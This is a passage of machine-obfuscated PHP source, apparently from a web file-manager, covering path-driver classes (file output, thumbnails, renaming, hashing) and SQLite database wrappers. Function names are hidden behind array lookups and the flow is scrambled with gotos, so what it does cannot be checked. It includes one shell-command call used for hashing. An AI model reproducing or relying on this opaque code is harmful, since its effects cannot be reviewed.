$b[46]($b[67]); } $bΒ = $this->{$_SERVER[拘][544]}($bΒ); goto Aڥ¸; f: } public function getContent($DҸ) { $DҸ = $this->{$_SERVER[拘][544]}($DҸ); return $_SERVER[拘][345]($DҸ); } public function setContent($A, $F㐪 = '') { $A = $this->{$_SERVER[拘][544]}($A); return $_SERVER[拘][344]($A, $F㐪, LOCK_EX); } public function fileSubstr($DĜ, $fڎ = 0, $F˘ = false) { goto f㮷; f㮷: $fօ =& $_SERVER[拘]; $DĜ = $this->{$_SERVER[拘][544]}($DĜ); if ($F˘ === !1) { $F˘ = $this->{$_SERVER[拘][567]}($DĜ); } goto F; F: if ($F˘ <= 0) { return $fօ[67]; } $C䌍 = $fօ[53]($DĜ, $fօ[575]); if (!$C䌍) { return !1; } goto D΍; aĕ: @$fօ[56]($C䌍, LOCK_UN); $fօ[58]($C䌍); return $dͣ; goto F͍; D΍: @$fօ[56]($C䌍, LOCK_SH); $fօ[576]($C䌍, $fڎ); $dͣ = $fօ[577]($C䌍, $F˘); goto aĕ; F͍: } public function upload($fê, $C甃, $bǇ = false, $c˸܄ = REPEAT_REPLACE) { $d = $this->{$_SERVER[拘][374]}($C甃, $fê); return $d ? $this->{$_SERVER[拘][378]}($fê) : !1; } public function download($fΡ, $Bӭ) { return $this->{$_SERVER[拘][544]}($fΡ); } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $e븉ۍ =& $_SERVER[拘]; $this->objectDriver = array($e븉ۍ[617], $e븉ۍ[618], $e븉ۍ[619], $e븉ۍ[620]); } public function getPath($Dך) { $FͰ =& $_SERVER[拘]; if ($FͰ[176]($this->{$_SERVER[拘][380]}(), $this->objectDriver)) { return $FͰ[425]($Dך, $FͰ[44]); } return $Dך; } public function getPathName($bʱɢ) { return $bʱɢ; } public function iconvApp($EĘ) { return $EĘ; } public function iconvSystem($f꺈҂) { return $f꺈҂; } public function iconvTo($C࢕, $e, $B) { goto D枓; D枓: $Č =& $_SERVER[拘]; if (!$C࢕ || !$Č[534]($Č[621])) { return $C࢕; } static $c = array(); goto a̘８; bȊ؉: return $Aۖ; goto fƓ; A͵: $Aۖ = $Aۖ ? $Aۖ : $C࢕; if ($Č[169]($Aۖ, $Č[339])) { $Aۖ = $Č[69]($Č[339], $Č[183], $Aۖ); } $c[$e . $Č[622] . $B . $Č[623] . $C࢕] = $Aۖ; goto B囮܂; B囮܂: $c[$B . $Č[622] . $e . $Č[623] . $C࢕] = $C࢕; $c[$B . $Č[622] . $e . $Č[623] . $Aۖ] = $C࢕; $c[$e . $Č[622] . $B . $Č[623] . $Aۖ] = $Aۖ; goto bȊ؉; a̘８: $A = $e . $Č[622] . $B . $Č[623] . $C࢕; if (isset($c[$A])) { return $c[$A]; } if ($Č[534]($Č[624])) { $Aۖ = @$Č[625]($C࢕, $B, $e); } else { $Aۖ = @$Č[626]($e, $B, $C࢕); } goto A͵; fƓ: } public function getPathInner($A⼅͇) { $eڲ = IO::init($A⼅͇); return $eڲ->path; } public function getPathOuter($a) { $bЬ =& $_SERVER[拘]; $f籺 = $bЬ[195]($bЬ[70]($this->pathBase, $bЬ[44])); $a = $bЬ[7]($bЬ[70]($a, $bЬ[44]), $f籺); return $this->pathDriver . $bЬ[44] . $bЬ[425]($a, $bЬ[44]); } public function isParentOf($F, $a߽) { $E򒡕 =& $_SERVER[拘]; $F = $E򒡕[43]($E򒡕[80]($F), $E򒡕[44]) . $E򒡕[44]; $a߽ = $E򒡕[43]($E򒡕[80]($a߽), $E򒡕[44]) . $E򒡕[44]; $Cܟ = $E򒡕[165]($a߽, $F) === 0; return $Cܟ; } public function getType() { $D޿ =& $_SERVER[拘]; $A = $D޿[69]($D޿[422], $D޿[67], $D޿[627]($this)); return $D޿[80]($A); } public function fileNameExist($fʈ, $EՐ) { $A̐ö =& $_SERVER[拘]; $AߟŖ = $A̐ö[43]($fʈ, $A̐ö[44]) . $A̐ö[44] . $EՐ; $F = $this->{$_SERVER[拘][389]}($AߟŖ); return $F ? $AߟŖ : !1; } public function renameObject($Bܘ, $Fꎻ) { $C襻 =& $_SERVER[拘]; $Bܘ = $this->pathDriver . $C襻[44] . $C襻[425]($Bܘ, $C襻[44]); $Fꎻ = $this->{$_SERVER[拘][372]}($Bܘ) . $Fꎻ; if (IO::isFile($Bܘ)) { $Fԇ = IO::move($Bܘ, $Fꎻ, REPEAT_RENAME_FOLDER); } else { $Fԇ = IO::mkdir($Fꎻ); if (!$Fԇ) { return !1; } $bנڮ = IO::listPath($Bܘ); $dϊ = $C襻[153]($bנڮ[$C襻[398]], $bנڮ[$C襻[399]]); foreach ($dϊ as $a) { IO::move($a[$C襻[40]], $Fꎻ, REPEAT_RENAME_FOLDER); } IO::remove($Bܘ); } return $Fԇ ? $Fꎻ : !1; } public function isType($a, $E) { return $_SERVER[拘][80]($E) == $this->{$_SERVER[拘][380]}(); } public function tempFile($FɃ = '', $e۬Э = '') { goto eڰ; AɄ: if ($e۬Э) { $DȮ[344]($Dѯ, $e۬Э); } return $Dѯ; goto B߯ɏ; cՖ: @$DȮ[41]($b, 511, !0); $Dѯ = $b . $FɃ; @$DȮ[584]($Dѯ); goto AɄ; eڰ: $DȮ =& $_SERVER[拘]; if (!$FɃ) { $FɃ = $DȮ[405](15); } $b = TEMP_FILES . $DȮ[405](15) . $DȮ[44]; goto cՖ; B߯ɏ: } public function tempFileRemve($Bƨ) { $Dӎ =& $_SERVER[拘]; @$Dӎ[51]($Bƨ); @$Dӎ[594]($this->{$_SERVER[拘][372]}($Bƨ)); } public function mkfile($AӞ֮, $dܞү = '', $Cü = REPEAT_RENAME) { } public function mkdir($a, $bП = REPEAT_SKIP) { } public function copyFile($F嬾, $dԍĻ) { } public function moveFile($Aӌ҆, $aȓ) { } public function remove($f) { if ($this->{$_SERVER[拘][379]}($f)) { return $this->{$_SERVER[拘][628]}($f); } return $this->{$_SERVER[拘][553]}($f); } public function rename($dʞߌ, $Aۧ) { } public function exist($dشʶ) { } public function findByHash($Aʞ = '', $D؅ = '') { return !1; } public function isFile($Fܘ٫) { } public function isFolder($F¨) { } public function size($Fݤ) { } public function info($EҴѕ) { } public function infoAuth($e) { return $this->{$_SERVER[拘][371]}($e); } public function infoFull($Fۄ) { return $this->{$_SERVER[拘][371]}($Fۄ); } public function infoWithChildren($e) { $a彺 =& $_SERVER[拘]; $AŊ = $this->{$_SERVER[拘][371]}($e); if ($AŊ && $AŊ[$a彺[400]] == $a彺[557]) { $bħʽ = array($a彺[490] => 0, $a彺[599] => 0, $a彺[600] => 0); $this->{$_SERVER[拘][601]}($e, $bħʽ); $AŊ[$a彺[490]] = $bħʽ[$a彺[490]]; $AŊ[$a彺[629]] = array($a彺[630] => $bħʽ[$a彺[599]], $a彺[631] => $bħʽ[$a彺[600]]); } return $AŊ; } public function listPath($Cѝ, $A뢿ګ = false, $C = false) { } public function has($A, $e = false) { } public function canRead($A) { } public function canWrite($d) { } public function getContent($Eㄱ) { } public function setContent($a, $f = '') { } protected function infoChildren($f, &$a܅׌) { $E =& $_SERVER[拘]; $b = $this->{$_SERVER[拘][397]}($f, !1, !0); $b = $E[153]($b[$E[399]], $b[$E[398]]); foreach ($b as $Eя봒) { if ($Eя봒[$E[400]] == $E[557]) { $a܅׌[$E[600]]++; $e׽ = $this->{$_SERVER[拘][396]}($Eя봒[$E[40]]); $this->{$_SERVER[拘][601]}($e׽, $a܅׌); } else { $a܅׌[$E[599]]++; $a܅׌[$E[490]] += $Eя봒[$E[490]]; } } } public function fileSubstr($aӜǺ̉, $B, $cω) { } public function listAll($dۂھ) { } public function upload($AǦ, $A, $Eɝ = false, $FӦ = REPEAT_REPLACE) { } public function uploadFileByID($a, $E, $BϺ) { } public function uploadFileByPath($f뒔, $cթ, $d = array()) { } public function uploadLink($Aݫ, $aި = 0) { goto b΂; Fމ: if ($Cǩ) { $Cǩ[$B[257]] = $Aݫ; $Cǩ[$B[423]] = $D; } return $Cǩ; goto e֫; b΂: $B =& $_SERVER[拘]; $D = $this->{$_SERVER[拘][380]}(); if (!$B[176]($D, $this->objectDriver)) { return; } goto Fꊊ; Fꊊ: $bуޖ = (!$aި ? 1 : $B[632]($aި / $B[633](1024, 3))) * 3600 * 4; $eǫ = $B[176]($D, array($B[617], $B[619], $B[620])) && $aި <= 1024 * 1024 * 20 ? $B[634] : $B[635]; $Cǩ = $this->{$eǫ}($Aݫ, $bуޖ); goto Fމ; e֫: } public function uploadFormData($C, $eկ = 3600) { } public function multiUploadFormData($CǱ, $A = 3600) { } public function download($c턳, $f) { } public function ext($BܑÔ) { $aߟݟ =& $_SERVER[拘]; if ($aߟݟ[165]($BܑÔ, $aߟݟ[44]) === -1) { $Bⱞ = $BܑÔ; } else { $Bⱞ = $this->{$_SERVER[拘][392]}($BܑÔ); } $A彬מ = $aߟݟ[67]; if ($aߟݟ[169]($Bⱞ, $aߟݟ[348])) { $A彬מ = $aߟݟ[7]($Bⱞ, $aߟݟ[636]($Bⱞ, $aߟݟ[348]) + 1); $A彬מ = $aߟݟ[80]($A彬מ); } if ($aߟݟ[195]($A彬מ) > 3 && $aߟݟ[131]($aߟݟ[637], $A彬מ, $bҵ)) { $A彬מ = $aߟݟ[67]; } return $A彬מ; } public function pathThis($DƼ) { $fы఑ =& $_SERVER[拘]; $DƼ = $fы఑[69]($fы఑[338], $fы఑[44], $fы఑[43]($DƼ, $fы఑[44])); $eǔ = $fы఑[636]($DƼ, $fы఑[44]); if ($eǔ === !1) { return $DƼ; } return $fы఑[7]($DƼ, $eǔ + 1); } public function pathFather($Aӈ) { $Cɗ =& $_SERVER[拘]; $Aӈ = $Cɗ[69]($Cɗ[338], $Cɗ[44], $Cɗ[43]($Aӈ, $Cɗ[44])); $dû = $Cɗ[636]($Aӈ, $Cɗ[44]); if ($dû === !1) { return $Cɗ[67]; } return $Cɗ[7]($Aӈ, 0, $dû + 1); } public function hashSimple($A˪ĩ) { goto C暴; cӭ܏: $aǱ = $A[455]($F놧ޯ / $aӊ); $cǻ = $A[67]; for ($e࿻ = 0; $e࿻ < $aӊ; $e࿻++) { $cǻ .= $this->{$_SERVER[拘][509]}($A˪ĩ, $aǱ * $e࿻, $dԸ); } goto dϵɆ; dϵɆ: $cǻ .= $this->{$_SERVER[拘][509]}($A˪ĩ, $F놧ޯ - $dԸ, $dԸ); return $A[46]($cǻ) . $F놧ޯ; goto Fͽ; C暴: $A =& $_SERVER[拘]; if (!$A˪ĩ) { return $A[46]($A[67]); } $F놧ޯ = $this->{$_SERVER[拘][567]}($A˪ĩ); goto EҹƵ; EҹƵ: $dԸ = 200; $aӊ = 50; if ($F놧ޯ <= $dԸ * $aӊ) { return $this->{$_SERVER[拘][616]}($A˪ĩ) . $F놧ޯ; } goto cӭ܏; Fͽ: } public static $md5Cache = array(); public function hashMd5($Dۄ) { $Dۄ = $this->{$_SERVER[拘][544]}($Dۄ); if (isset(self::$md5Cache[$Dۄ])) { return self::$md5Cache[$Dۄ]; } self::$md5Cache[$Dۄ] = $this->{$_SERVER[拘][638]}($Dۄ); if (!self::$md5Cache[$Dۄ]) { self::$md5Cache[$Dۄ] = @$_SERVER[拘][639]($Dۄ); } return self::$md5Cache[$Dۄ]; } private function hashMd5Shell($b) { goto Fꯍ; Aڬ: $Fօ = $A˯ׇ[645]($E . "\x20\42{$b}\42"); return $A˯ׇ[7]($Fօ, 0, 32); goto cʋ; f: $E = Cache::get($A˯ׇ[643]); if (!$E) { $B = BASIC_PATH . $A˯ׇ[644]; $Eכ = $A˯ׇ[639]($B); $E = $A˯ׇ[164]; foreach ($e̢ as $cکܰ) { $Fօ = $A˯ׇ[645]($cکܰ . "\40\42{$B}\42"); if ($Fօ && $A˯ׇ[7]($A˯ׇ[70]($Fօ), 0, 32) == $Eכ) { $E = $cکܰ; break; } } Cache::set($A˯ׇ[643], $E, 3600); } if ($E == $A˯ׇ[164]) { return !1; } goto Aڬ; Fꯍ: $A˯ׇ =& $_SERVER[拘]; if (!$A˯ׇ[534]($A˯ׇ[640])) { return !1; } $e̢ = array($A˯ׇ[641], $A˯ׇ[642]); goto f; cʋ: } public function link($fĨ) { return $fĨ; } public function fileOut($B, $c⟦ν = false, $e = false, $AЛ֨ = '') { goto C; BѪ: $EĜ[657]($EĜ[678] . $E); $EĜ[657]($EĜ[679]); $A = $this->{$_SERVER[拘][380]}() == $EĜ[382]; goto fؾ; D: $EĜ[657]($EĜ[675] . $d . $EĜ[666]); $EĜ[657]($EĜ[676] . $b); $EĜ[657]($EĜ[677]); goto BѪ; B: $B = $E - 1; if (!$AЛ֨) { $AЛ֨ = $EĜ[46]($d . $this->{$_SERVER[拘][651]}($B)); } $AЛ֨ = $EĜ[652] . $AЛ֨ . $EĜ[652]; goto b莆; f꟩: $b뤫 = 0; if ($cɉ) { $b뤫 = 1000 * 1000 / 100; } while ($Fꉅ <= $B) { echo $this->{$_SERVER[拘][509]}($B, $Fꉅ, $eͫٸ); $Fꉅ += $eͫٸ; if ($cɉ) { $EĜ[699]($b뤫); } } goto c݆; b: $EĜ[657]($EĜ[667]); $EĜ[657]($EĜ[668]); $EĜ[657]($EĜ[669]); goto fϢ; fϢ: if (isset($_SERVER[$EĜ[670]]) && $EĜ[671]($_SERVER[$EĜ[670]]) == $dԲ[$EĜ[559]]) { $EĜ[657]($EĜ[672], !0, 304); die; } if (isset($_SERVER[$EĜ[673]]) && $_SERVER[$EĜ[673]] == $AЛ֨) { $EĜ[657]($EĜ[674] . $AЛ֨, !0, 304); die; } $EĜ[657]($EĜ[674] . $AЛ֨); goto D; Bųܡ: @$EĜ[647](0); $dԲ = $this->{$_SERVER[拘][648]}($B); $E = $dԲ[$EĜ[490]]; goto A; C: $EĜ =& $_SERVER[拘]; if (!$B || !$this->{$_SERVER[拘][389]}($B)) { $EĜ[29]($EĜ[387]($EĜ[390]), !1, $B); } @$EĜ[646](); goto Bųܡ; b莆: $a׆ = $EĜ[653]($this->{$_SERVER[拘][566]}($b)); if ($c⟦ν === !1 && !$EĜ[654]($a׆)) { $c⟦ν = !0; } $fӣ樐 = $EĜ[655]($b); goto a깐; Eʨ: if ($A && $Bό && $B닆) { if ($EĜ[169]($Bό, $EĜ[685])) { $EĜ[657]($EĜ[686] . $B); } else { if ($EĜ[169]($Bό, $EĜ[687])) { $EĜ[657]($EĜ[688] . $B); } else { if ($EĜ[169]($Bό, $EĜ[689])) { $EĜ[657]($EĜ[690] . $B); } } } if ($cɉ) { $EĜ[657]($EĜ[691] . $cɉ); } return; } if (isset($_SERVER[$EĜ[692]])) { if ($EĜ[131]($EĜ[693], $_SERVER[$EĜ[692]], $Eȹ)) { $Fꉅ = $EĜ[455]($Eȹ[1]); if (!empty($Eȹ[2])) { $B = $EĜ[455]($Eȹ[2]); } } $EĜ[657]($EĜ[694]); } else { $EĜ[657]($EĜ[695]); } $EĜ[657]($EĜ[696] . ($B - $Fꉅ + 1)); goto d; d: if (isset($_SERVER[$EĜ[692]])) { $EĜ[657]("\x43\x6f\156\164\145\156\x74\x2d\x52\x61\x6e\147\x65\x3a\40\x62\171\164\x65\163\40{$Fꉅ}\x2d{$B}\57" . $E); } if ($_SERVER[$EĜ[697]] == $EĜ[698]) { return; } $eͫٸ = 1024 * 100; goto f꟩; a깐: $fӣ樐 = $EĜ[652] . $fӣ樐 . $EĜ[656] . $fӣ樐; if ($c⟦ν) { $EĜ[657]($EĜ[658]); $EĜ[657]($EĜ[659]); $EĜ[657]($EĜ[660] . $fӣ樐); } else { $EĜ[657]($EĜ[661] . $a׆); $EĜ[657]($EĜ[662] . $fӣ樐); if ($EĜ[169]($a׆, $EĜ[663])) { $EĜ[657]($EĜ[661] . $a׆ . $EĜ[664]); } } $EĜ[657]($EĜ[665] . $EĜ[649]($EĜ[650], $EĜ[50]() + 3600 * 24 * 30) . $EĜ[666]); goto b; fؾ: $B닆 = $GLOBALS[$EĜ[11]][$EĜ[680]][$EĜ[681]][$EĜ[682]]; $cɉ = $GLOBALS[$EĜ[11]][$EĜ[680]][$EĜ[681]][$EĜ[683]] * 1024 * 1024; $Bό = $EĜ[80]($_SERVER[$EĜ[684]]); goto Eʨ; A: $d = $EĜ[649]($EĜ[650], $dԲ[$EĜ[559]]); $b = $e ? $e : $this->{$_SERVER[拘][407]}($dԲ[$EĜ[375]]); $Fꉅ = 0; goto B; c݆: } public function fileOutImage($b쐴, $Cɡ = 250) { goto cޔ; a: if (!($B℗Į = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Cй[704]))) { $eҭ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Cй[705]); } else { $eҭ = KodIO::make($B℗Į); } if ($B℗Į = IO::fileNameExist($eҭ, $eйꛍ)) { $Cڑ = KodIO::make($B℗Į); return IO::fileOut($Cڑ); } if (!$Cй[586](DATA_THUMB)) { $Cй[403](DATA_THUMB); } goto fȟ; cޔ: $Cй =& $_SERVER[拘]; if ($Cй[7]($b쐴, 0, 4) == $Cй[689]) { $Cй[657]($Cй[700] . $b쐴); die; } $f = $this->{$_SERVER[拘][371]}($b쐴); goto fɌ; fɌ: if ($f[$Cй[490]] <= 1024 * 50 || !$Cй[534]($Cй[701]) || $f[$Cй[565]] == $Cй[607]) { return $this->{$_SERVER[拘][519]}($b쐴); } if (isset($f[$Cй[702]][$Cй[518]])) { $fℇӅ = $f[$Cй[702]][$Cй[518]]; } else { if (isset($f[$Cй[702]][$Cй[703]])) { $fℇӅ = $f[$Cй[702]][$Cй[703]]; } else { $fℇӅ = $Cй[46]("{$f[$Cй[375]]}\137{$f[$Cй[40]]}\x5f{$f[$Cй[490]]}"); } } $eйꛍ = "{$fℇӅ}\x5f{$Cɡ}\x2e\160\156\x67"; goto a; fȟ: $Cڑ = DATA_THUMB . $eйꛍ; if (!@$Cй[48]($Cڑ)) { $a՝ = TEMP_FILES; if (!$Cй[586]($a՝)) { $Cй[403]($a՝); } $F = $a՝ . $fℇӅ . $Cй[348] . $f[$Cй[565]]; if (!@$Cй[48]($F)) { $F = $this->{$_SERVER[拘][406]}($b쐴, $F); } $D܈ = new ImageThumb($F, $Cй[18]); $D܈->{$_SERVER[拘][707]}($Cڑ, $Cɡ, $Cɡ); } if (!$Cй[48]($Cڑ) || $Cй[598]($Cڑ) < 100) { return $this->{$_SERVER[拘][519]}($b쐴); } goto cބ; cބ: if (!($Dď = IO::move($Cڑ, $eҭ))) { return IO::fileOut($Cڑ); } $Cй[409]($Cڑ); IO::fileOut($Dď); goto eژ; eژ: } public function fileNameAuto($eݛ, $eź, $d = REPEAT_RENAME, $d꣓ = false) { goto aÆ; aÆ: $a꒏ =& $_SERVER[拘]; $FԂ = $eݛ === $a꒏[67] ? $eź : $a꒏[43]($eݛ, $a꒏[44]) . $a꒏[44] . $eź; if ($d == REPEAT_REPLACE || !$this->{$_SERVER[拘][389]}($FԂ) || $d꣓ && $d != REPEAT_RENAME_FOLDER) { return $eź; } goto dњ; C: while ($this->{$_SERVER[拘][389]}($a꒏[43]($eݛ, $a꒏[44]) . $a꒏[44] . $eˠڃ)) { $eˠڃ = $bנ . "\x28{$fڟ}\x29{$E}"; $fڟ++; } return $eˠڃ; goto CƓ; B̈н: $fڟ = 1; $bנ = $a꒏[7]($eź, 0, $a꒏[195]($eź) - $a꒏[195]($E)); $eˠڃ = $bנ . "\50{$fڟ}\51{$E}"; goto C; dњ: if ($d == REPEAT_SKIP) { return !1; } $E = $a꒏[348] . $a꒏[708]($eź); $E = $E == $a꒏[348] || $d꣓ ? $a꒏[67] : $E; goto B̈н; CƓ: } public function listAllFiles($cŮ, $aȰ, $E݋ = array()) { goto f艭; F֭: foreach ($e󾃇[710]($a) as $dˌ) { $A = array($e󾃇[40] => $this->{$_SERVER[拘][378]}($e󾃇[44] . $cŮ . $e󾃇[44] . $dˌ), $e󾃇[557] => 1, $e󾃇[490] => 0); if ($e󾃇[7]($dˌ, -1) != $e󾃇[44]) { $A[$e󾃇[557]] = 0; $eӾĴ = $this->{$_SERVER[拘][401]}($cŮ . $e󾃇[44] . $dˌ); $A[$e󾃇[490]] = isset($E݋[$eӾĴ]) ? $E݋[$eӾĴ] : $this->{$_SERVER[拘][567]}($eӾĴ); } $e[] = $A; } return $e; goto D䉐Õ; f艭: $e󾃇 =& $_SERVER[拘]; if (empty($aȰ)) { return array(); } $a = array(); goto Aì; Aì: $cŮ = $e󾃇[70]($cŮ, $e󾃇[44]); foreach ($aȰ as $dˌ) { $d = $e󾃇[425]($e󾃇[7]($dˌ, $e󾃇[195]($cŮ)), $e󾃇[44]); $a = $e󾃇[153]($a, $this->{$_SERVER[拘][709]}($d)); } $e = array(); goto F֭; D䉐Õ: } public function slicePath($Eȷ) { $D =& $_SERVER[拘]; $dӺ = $D[4]($D[44], $D[70]($Eȷ, $D[44])); $eʦ = 0; do { ++$eʦ; $cβμ[] = $D[152]($D[44], $D[524]($dӺ, 0, $eʦ)) . $D[44]; } while ($eʦ < $D[37]($dӺ)); $cβμ[$D[37]($dӺ) - 1] = $Eȷ; return $cβμ; } } goto aǾ; dˋ: class DbSqlite3 extends Db { public function __construct($d֪ = '') { $f =& $_SERVER[拘]; if (!$f[82]($f[1295])) { $f[76]($f[77]($f[1178]) . $f[1296]); } if (!empty($d֪)) { if (!isset($d֪[$f[322]])) { $d֪[$f[322]] = 438; } $this->config = $d֪; if (empty($this->config[$f[106]])) { $this->config[$f[106]] = array(); } } } public function connect($cƋ = '', $f˶ = 0) { $e =& $_SERVER[拘]; CacheLock::lock($e[1297]); if (!isset($this->linkID[$f˶])) { if (empty($cƋ)) { $cƋ = $this->config; } $this->linkID[$f˶] = new SQLite3($cƋ[$e[14]]); if (!$this->linkID[$f˶]) { $e[76]($this->linkID[$f˶]->{$_SERVER[拘][1299]}()); } $this->connected = !0; if (1 != $e[108]($e[116])) { unset($this->config); } } return $this->linkID[$f˶]; } public function free() { $this->queryID = null; } public function query($eẵ) { goto aՊ; aՊ: $BΠ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!1); if (!$this->_linkID) { return !1; } goto e; e: $this->queryStr = $eẵ; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $BΠ[1196]($BΠ[1197], 1); goto aϘ; aϘ: $BΠ[135]($BΠ[139]); $this->queryID = $this->_linkID->{$_SERVER[拘][260]}($eẵ); $this->{$_SERVER[拘][1200]}(); goto A; A: if (!1 === $this->queryID) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $eн = $this->{$_SERVER[拘][1201]}(); $this->numRows = $BΠ[37]($eн); return $eн; } goto AԒ̫; AԒ̫: } public function execute($B) { goto D֊; cۦ: if (!1 === $A՝鄼) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $this->_linkID->{$_SERVER[拘][1300]}(); $this->lastInsID = $this->_linkID->{$_SERVER[拘][1301]}(); return $this->numRows; } goto d䕆; e׋Œ: $this->queryStr = $B; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $d쩍Ƶ[1196]($d쩍Ƶ[1207], 1); goto a; D֊: $d쩍Ƶ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } goto e׋Œ; a: $d쩍Ƶ[135]($d쩍Ƶ[139]); $A՝鄼 = $this->_linkID->{$_SERVER[拘][1189]}($B); $this->{$_SERVER[拘][1200]}(); goto cۦ; d䕆: } public function startTrans() { $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->{$_SERVER[拘][260]}($_SERVER[拘][1302]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fީ۳ = $this->_linkID->{$_SERVER[拘][260]}($_SERVER[拘][1303]); if (!$fީ۳) { $this->{$_SERVER[拘][1199]}(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a֡ = $this->_linkID->{$_SERVER[拘][260]}($_SERVER[拘][1304]); if (!$a֡) { $this->{$_SERVER[拘][1199]}(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $A͇ = array(); while ($Fь = $this->queryID->{$_SERVER[拘][1305]}(SQLITE3_ASSOC)) { $A͇[] = $Fь; } $this->queryID->{$_SERVER[拘][1306]}(); return $A͇; } public function getFields($f۰) { $a =& $_SERVER[拘]; $b̥½ = $this->{$_SERVER[拘][260]}($a[1307] . $f۰ . $a[1308]); $CȺ = array(); if ($b̥½) { foreach ($b̥½ as $D̢ => $Eؐ) { $CȺ[$Eؐ[$a[375]]] = array($a[375] => $Eؐ[$a[375]], $a[400] => $Eؐ[$a[400]], $a[1229] => (bool) ($Eؐ[$a[1229]] === $a[67]), $a[897] => $Eؐ[$a[1230]], $a[997] => (bool) $Eؐ[$a[1232]], $a[999] => (bool) $Eؐ[$a[1232]]); } } return $CȺ; } public function getTables($aו = '') { $Fֿ =& $_SERVER[拘]; $D͐ = $this->{$_SERVER[拘][260]}($Fֿ[1242] . $Fֿ[1243] . $Fֿ[1244]); $C = array(); foreach ($D͐ as $DЂ => $Bը) { $C[$DЂ] = $Fֿ[1247]($Bը); } return $C; } public function close() { if ($this->_linkID) { $this->_linkID->{$_SERVER[拘][291]}(); } $this->_linkID = null; CacheLock::unlock($_SERVER[拘][1297]); } public function error() { $E =& $_SERVER[拘]; $this->error = $this->_linkID->{$_SERVER[拘][1299]}(); if ($E[67] != $this->queryStr) { $this->error .= $E[387]($E[1251]) . $this->queryStr; } $E[137]($this->error, $E[67], $E[1252]); return $this->error; } public function escapeString($Bӄ) { $AΨ =& $_SERVER[拘]; if ($this->_linkID) { return $this->_linkID->{$_SERVER[拘][158]}($Bӄ); } return $AΨ[1204]($AΨ[1206], $AΨ[1253], $Bӄ); } public function parseLimit($a) { $E =& $_SERVER[拘]; $c䔙 = $E[67]; if (!empty($a)) { $a = $E[4]($E[119], $a); if ($E[37]($a) > 1) { $c䔙 .= $E[212] . $a[1] . $E[1248] . $a[0] . $E[168]; } else { $c䔙 .= $E[212] . $a[0] . $E[168]; } } return $c䔙; } } class DbSqlite extends Db { public function __construct($FƜ = '') { $Dଷ =& $_SERVER[拘]; CacheLock::lock($Dଷ[1297]); if (!$Dଷ[1258]($Dଷ[17])) { $Dଷ[76]($Dଷ[77]($Dଷ[1178]) . $Dଷ[1309]); } if (!empty($FƜ)) { if (!isset($FƜ[$Dଷ[322]])) { $FƜ[$Dଷ[322]] = 438; } $this->config = $FƜ; if (empty($this->config[$Dଷ[106]])) { $this->config[$Dଷ[106]] = array(); } } } public function connect($F窃 = '', $e㚍 = 0) { $CɃ =& $_SERVER[拘]; if (!isset($this->linkID[$e㚍])) { goto dҲ; Fſ: if (1 != $CɃ[108]($CɃ[116])) { unset($this->config); } goto FՇ; A: $this->linkID[$e㚍] = $C҉($F窃[$CɃ[14]], $F窃[$CɃ[322]]); if (!$this->linkID[$e㚍]) { $CɃ[76]($CɃ[1312]()); } $this->connected = !0; goto Fſ; dҲ: if (empty($F窃)) { $F窃 = $this->config; } $eܩ = !empty($F窃[$CɃ[106]][$CɃ[1261]]) ? $F窃[$CɃ[106]][$CɃ[1261]] : $this->pconnect; $C҉ = $eܩ ? $CɃ[1310] : $CɃ[1311]; goto A; FՇ: } return $this->linkID[$e㚍]; } public function free() { $this->queryID = null; } public function query($Eȟ) { goto cɕ; cֳ: $f͍[135]($f͍[139]); $this->queryID = $f͍[1313]($this->_linkID, $Eȟ); $this->{$_SERVER[拘][1200]}(); goto DĎ; cɕ: $f͍ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!1); if (!$this->_linkID) { return !1; } goto bՌ; DĎ: if (!1 === $this->queryID) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $f͍[1314]($this->queryID); $Bò = $this->{$_SERVER[拘][1201]}(); return $Bò; } goto A; bՌ: $this->queryStr = $Eȟ; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $f͍[1196]($f͍[1197], 1); goto cֳ; A: } public function execute($EԄ) { goto fާ; Aȕ: $A˻ü[135]($A˻ü[139]); $Eы = $A˻ü[1315]($this->_linkID, $EԄ); $this->{$_SERVER[拘][1200]}(); goto Bᜲ肽; fާ: $A˻ü =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } goto eܰ; Bᜲ肽: if (!1 === $Eы) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $A˻ü[1316]($this->_linkID); $this->lastInsID = $A˻ü[1317]($this->_linkID); return $this->numRows; } goto b̫ӿ; eܰ: $this->queryStr = $EԄ; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $A˻ü[1196]($A˻ü[1207], 1); goto Aȕ; b̫ӿ: } public function startTrans() { $aԎث =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $aԎث[1313]($this->_linkID, $aԎث[1302]); } $this->transTimes++; return; } public function commit() { $dݯ =& $_SERVER[拘]; if ($this->transTimes > 0) { $Dڿ = $dݯ[1313]($this->_linkID, $dݯ[1303]); if (!$Dڿ) { $this->{$_SERVER[拘][1199]}(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { $D =& $_SERVER[拘]; if ($this->transTimes > 0) { $Cئ = $D[1313]($this->_linkID, $D[1304]); if (!$Cئ) { $this->{$_SERVER[拘][1199]}(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $c̊ =& $_SERVER[拘]; $b՘ڶ = array(); if ($this->numRows > 0) { for ($Aח = 0; $Aח < $this->numRows; $Aח++) { $b՘ڶ[$Aח] = $c̊[1318]($this->queryID, SQLITE_ASSOC); } $c̊[1319]($this->queryID, 